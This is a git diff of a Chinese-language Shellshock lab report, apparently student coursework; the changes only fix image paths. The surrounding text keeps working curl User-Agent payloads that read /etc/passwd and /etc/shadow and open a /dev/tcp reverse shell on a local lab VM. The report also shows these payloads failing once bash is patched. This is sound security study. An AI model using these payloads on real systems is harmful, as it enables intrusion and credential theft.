@@ -8,33 +8,33 @@
 
 如下图，使用`bash 4.2.0`版本。
 
-![shellshock_version](F:\大三下\攻防对抗技术\images\lab2-task1-shellshock_version.png)
+![shellshock_version](../images/lab2-task1-shellshock_version.png)
 
 结果如下，可以看到父进程定义的函数被成功传递到子进程，存在`shellshock`漏洞。
 
-![shellshock](F:\大三下\攻防对抗技术\images\lab2-task1-shellshock.png)
+![shellshock](../images/lab2-task1-shellshock.png)
 
 ###  /bin/bash
 
 如下图，使用`bash 4.3.46`版本。
 
-![bash_version](F:\大三下\攻防对抗技术\images\lab2-task1-bash_version.png)
+![bash_version](../images/lab2-task1-bash_version.png)
 
 可以看到在父进程中定义的函数并没有传递到子进程，
 
-![bash](F:\大三下\攻防对抗技术\images\lab2-task1-bash.png)
+![bash](../images/lab2-task1-bash.png)
 
 ## Task2: Setting up CGI programs
 
 设置如下图
 
-![setup_cgi](F:\大三下\攻防对抗技术\images\lab2-task2-setup-cgi.png)
+![setup_cgi](../images/lab2-task2-setup-cgi.png)
 
 ## Task3: Passing Data to Bash via Environment Variable
 
 结果如下图
 
-![test_cgi](F:\大三下\攻防对抗技术\images\lab2-task3-test-cgi.png)
+![test_cgi](../images/lab2-task3-test-cgi.png)
 
 远程用户之所以能获取到系统当前shell的环境变量信息，是因为通过`curl`命令访问http://localhost/cgi-bin/myprog.cgi，而`myprog.cgi`的功能就是打印当前shell进程的环境变量。
 
@@ -44,7 +44,7 @@
 
 执行命令`curl -A "() { echo 233; }; echo Content-type:text/plain; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/myprog.cgi`
 
-![cat_passwd](F:\大三下\攻防对抗技术\images\lab2-task4-cat-passwd.png)
+![cat_passwd](../images/lab2-task4-cat-passwd.png)
 
 ### Step2: 获取`/etc/shadow`内容
 
@@ -52,7 +52,7 @@
 
 结果如下
 
-![cat_shadow](F:\大三下\攻防对抗技术\images\lab2-task4-cat-shadow.png)
+![cat_shadow](../images/lab2-task4-cat-shadow.png)
 
 可以看到**没有成功获取**。
 
@@ -60,17 +60,17 @@
 
 执行命令`curl -A "() { echo 233; }; echo Content-type:text/plain; echo; /usr/bin/whoami" http://localhost/cgi-bin/myprog.cgi`
 
-![whoami](F:\大三下\攻防对抗技术\images\lab2-task4-whoami.png)
+![whoami](../images/lab2-task4-whoami.png)
 
 可以看到结果为`www-data`，这就是我们执行`/bin/cat /etc/shadow`失败的原因，因为获取`/etc/shadow`的内容需要`root`权限。
 
-![sudo-cat-shadow](F:\大三下\攻防对抗技术\images\lab2-task4-sudo-cat.png)
+![sudo-cat-shadow](../images/lab2-task4-sudo-cat.png)
 
 ## Task5: Getting a Reverse Shell via Shellshock Attack
 
 这里使用本机localhost当做远程服务器，ip为`192.168.33.131`。
 
-![ifconfig](F:\大三下\攻防对抗技术\images\lab2-task5-ifconfig.png)
+![ifconfig](../images/lab2-task5-ifconfig.png)
 
 首先执行命令`curl -A "() { echo 233; }; echo Content_type:text/plain; echo; /bin/bash_shellshock -i > /dev/tcp/192.168.33.131/9090 0>&1" http://localhost/cgi-bin/myprog.cgi`。
 
@@ -88,7 +88,7 @@
 
 结果如下
 
-![reverse_shell](F:\大三下\攻防对抗技术\images\lab2-task5-reverse-shell.png)
+![reverse_shell](../images/lab2-task5-reverse-shell.png)
 
 
 
@@ -98,13 +98,13 @@
 
 结果如下，和`bash_shellshock`的输出无差异，因为该命令与是否有`shellshock`漏洞无关。
 
-![task3_repeat](F:\大三下\攻防对抗技术\images\lab2-task6-task3.png)
+![task3_repeat](../images/lab2-task6-task3.png)
 
 ### Step2: Launching the Shell shock Attack
 
 执行命令`curl -A "() { echo 233; }; echo Content-type:text/plain; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/myprog.cgi`。
 
-![task4_repeat](F:\大三下\攻防对抗技术\images\lab2-task6-task4.png)
+![task4_repeat](../images/lab2-task6-task4.png)
 
 可以看到并没有执行`/bin/cat /etc/passwd`，因为bash中`shellshock`漏洞被修复。
 
@@ -112,7 +112,7 @@
 
 执行命令`curl -A "() { echo 233; }; echo Content_type:text/plain; echo; /bin/bash -i > /dev/tcp/192.168.33.131/9090 0>&1" http://localhost/cgi-bin/myprog.cgi`。
 
-![task5_repeat](F:\大三下\攻防对抗技术\images\lab2-task6-task5.png)
+![task5_repeat](../images/lab2-task6-task5.png)
 
 可以看到反弹shell也失败了，原因在于bash中`shellshock`漏洞被修复，无法执行额外的命令。
 
